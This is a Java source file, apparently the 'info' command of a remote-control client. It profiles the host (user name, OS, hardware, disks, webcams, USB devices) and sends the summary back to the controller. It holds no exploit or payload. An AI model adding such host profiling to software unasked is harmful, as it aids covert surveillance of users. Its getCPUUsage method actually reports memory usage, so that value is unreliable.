package br.com.introcdc.connect.client.commands.info;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:07
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.FileComponents;
import com.github.sarxos.webcam.Webcam;
import com.sun.jna.Native;
import com.sun.jna.Structure;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.platform.win32.WinReg;
import com.sun.jna.win32.StdCallLibrary;
import oshi.SystemInfo;
import oshi.hardware.*;
import oshi.software.os.OperatingSystem;
import oshi.util.FormatUtil;

import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.util.Arrays;
import java.util.List;

public class ClientCommandInfo extends ClientCommand {

    public ClientCommandInfo() {
        super("info");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        msg(getPCInfo());
    }

    public String getPCInfo() {
        try {
            StringBuilder stringBuilder = new StringBuilder("> " + System.getProperty("user.name") + " - ");
            SystemInfo si = new SystemInfo();
            OperatingSystem os = si.getOperatingSystem();
            stringBuilder.append(os.getFamily()).append(" ").append(os.getVersionInfo().getVersion()).append(" (").append(os.getManufacturer()).append(")");
            stringBuilder.append("\nPasta atual: ").append(new File(FileComponents.FOLDER).getAbsolutePath());
            stringBuilder.append("\nProcessos: ").append(os.getProcessCount()).append(" - Sessões: ").append(os.getSessions().size());
            stringBuilder.append("\nBoot: ").append(FileComponents.toDate(os.getSystemBootTime() * 1000L)).append(" - ").append(FileComponents.toTime(os.getSystemUptime()));

            String processorName = getProcessorName();
            double cpuUsage = getCPUUsage();
            CentralProcessor cpu = si.getHardware().getProcessor();
            stringBuilder.append("\nProcessador: ").append(processorName).append(" (").append(String.format("%.2f", cpuUsage)).append("%) | ").append(cpu.getPhysicalProcessorCount()).append("/").append(cpu.getLogicalProcessorCount()).append(" | ").append(FormatUtil.formatHertz(cpu.getMaxFreq()));

            GlobalMemory memory = si.getHardware().getMemory();
            java.util.List<PhysicalMemory> physicalMemories = si.getHardware().getMemory().getPhysicalMemory();
            stringBuilder.append("\nMemória: ").append(FormatUtil.formatBytes(memory.getTotal() - memory.getAvailable())).append(" / ").append(FormatUtil.formatBytes(memory.getTotal())).append(" (").append(physicalMemories.size()).append(")\n - ");
            for (PhysicalMemory physicalMemory : physicalMemories) {
                stringBuilder.append(FormatUtil.formatBytes(physicalMemory.getCapacity())).append(" (").append(physicalMemory.getMemoryType()).append(") ");
            }

            Runtime runtime = Runtime.getRuntime();
            stringBuilder.append("\nRAM: ").append(FormatUtil.formatBytes(runtime.totalMemory() - runtime.freeMemory())).append("/").append(FormatUtil.formatBytes(runtime.totalMemory()))
                    .append(" | ").append(FormatUtil.formatBytes(runtime.freeMemory())).append("/").append(FormatUtil.formatBytes(runtime.maxMemory()));

            stringBuilder.append("\n\nMonitores: ").append(si.getHardware().getDisplays().size()).append(" - Webcams: ").append(Webcam.getWebcams().size());
            java.util.List<GraphicsCard> graphicsCards = si.getHardware().getGraphicsCards();
            stringBuilder.append("\nPlacas Gráficas: ").append(graphicsCards.size());
            for (GraphicsCard graphicsCard : graphicsCards) {
                stringBuilder.append("\n ").append(graphicsCard.getVendor()).append(" ").append(graphicsCard.getName()).append(" (").append(FormatUtil.formatBytes(graphicsCard.getVRam())).append(" VRAM)");
            }

            File[] roots = File.listRoots();
            if (roots != null && roots.length > 0) {
                FileSystemView fsv = FileSystemView.getFileSystemView();
                stringBuilder.append("\n\nArmazenamentos: ");
                for (File root : roots) {
                    String displayName = fsv.getSystemDisplayName(root);
                    stringBuilder.append(displayName.isEmpty() ? root.getAbsolutePath() : displayName).append(" ");
                }
            } else {
                stringBuilder.append("\n");
            }
            java.util.List<HWDiskStore> diskStores = si.getHardware().getDiskStores();
            stringBuilder.append("\nDiscos: ").append(diskStores.size()).append(" discos");
            for (HWDiskStore disk : diskStores) {
                stringBuilder.append("\n ").append(disk.getModel()).append(" / ").append(FormatUtil.formatBytes(disk.getSize()));
            }

            stringBuilder.append("\n\nInterfaces de Audio: ").append(si.getHardware().getSoundCards().size());
            stringBuilder.append("\nInterfaces USB: ").append(si.getHardware().getUsbDevices(true).size()).append("/").append(si.getHardware().getUsbDevices(false).size());
            return stringBuilder.toString();
        } catch (Exception exception) {
            msg("Ocorreu um erro ao identificar as informações do computador, exibindo informações básicas... (" + exception.getMessage() + ")");
            exception(exception);
        }
        return getPCInfoSimple();
    }

    public String getPCInfoSimple() {
        StringBuilder sb = new StringBuilder();
        sb.append("> Cliente: ").append(System.getProperty("user.name")).append("\n");
        sb.append("Pasta atual: ").append(new File(FileComponents.FOLDER).getAbsolutePath()).append("\n");
        sb.append("Sistema Operacional: ")
                .append(System.getProperty("os.name")).append(" ")
                .append(System.getProperty("os.version")).append(" (")
                .append(System.getProperty("os.arch")).append(")\n");

        sb.append("Java: ")
                .append(System.getProperty("java.runtime.name")).append(" ")
                .append(System.getProperty("java.version")).append(" (")
                .append(System.getProperty("java.vendor")).append(")\n");

        Runtime runtime = Runtime.getRuntime();
        sb.append("\nRAM: ").append(FormatUtil.formatBytes(runtime.totalMemory() - runtime.freeMemory())).append("/").append(FormatUtil.formatBytes(runtime.totalMemory()))
                .append(" | ").append(FormatUtil.formatBytes(runtime.freeMemory())).append("/").append(FormatUtil.formatBytes(runtime.maxMemory()));
        return sb.toString();
    }

    public interface Kernel32 extends StdCallLibrary {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);

        WinNT.HANDLE GetCurrentProcess();
    }

    public interface Psapi extends StdCallLibrary {
        Psapi INSTANCE = Native.load("psapi", Psapi.class);

        int GetPerformanceInfo(PERFORMANCE_INFORMATION pPerformanceInformation, int cb);
    }

    public static class PERFORMANCE_INFORMATION extends Structure {
        public int cb;
        public long CommitTotal;
        public long CommitLimit;
        public long CommitPeak;
        public long PhysicalTotal;
        public long PhysicalAvailable;
        public long SystemCache;
        public long KernelTotal;
        public long KernelPaged;
        public long KernelNonpaged;
        public long PageSize;
        public long HandleCount;
        public long ProcessCount;
        public long ThreadCount;

        @Override
        protected List<String> getFieldOrder() {
            return Arrays.asList(
                    "cb",
                    "CommitTotal",
                    "CommitLimit",
                    "CommitPeak",
                    "PhysicalTotal",
                    "PhysicalAvailable",
                    "SystemCache",
                    "KernelTotal",
                    "KernelPaged",
                    "KernelNonpaged",
                    "PageSize",
                    "HandleCount",
                    "ProcessCount",
                    "ThreadCount"
            );
        }
    }

    public static String getProcessorName() {
        return Advapi32Util.registryGetStringValue(
                WinReg.HKEY_LOCAL_MACHINE,
                "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                "ProcessorNameString"
        );
    }

    public static double getCPUUsage() {
        Kernel32 kernel32 = Kernel32.INSTANCE;
        Psapi psapi = Psapi.INSTANCE;

        WinNT.HANDLE handle = kernel32.GetCurrentProcess();
        PERFORMANCE_INFORMATION perfInfo = new PERFORMANCE_INFORMATION();
        if (psapi.GetPerformanceInfo(perfInfo, perfInfo.size()) == 0) {
            throw new RuntimeException("Falha ao obter informações de desempenho");
        }

        long totalPhysicalMemory = perfInfo.PhysicalTotal * perfInfo.PageSize;
        long availablePhysicalMemory = perfInfo.PhysicalAvailable * perfInfo.PageSize;
        return ((double) (totalPhysicalMemory - availablePhysicalMemory) / totalPhysicalMemory) * 100;
    }

}
